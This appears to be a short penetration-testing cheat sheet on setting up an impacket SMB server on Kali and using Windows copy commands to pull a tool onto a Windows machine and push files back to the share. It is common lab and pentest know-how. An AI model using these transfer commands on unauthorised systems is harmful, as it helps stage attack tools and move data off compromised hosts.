# SMB Share

### 1) On Kali, create an SMB Server using impacket

    impacket-smbserver -smb2support <share_name> <directory>

### 2) Transfer files using the copy command on Windows machine

Download: 
    
    copy \\<Kali-IP>\<share_name>\tool.exe

Upload: 
    
    copy notes.txt \\<Kali-IP>\<share_name>\
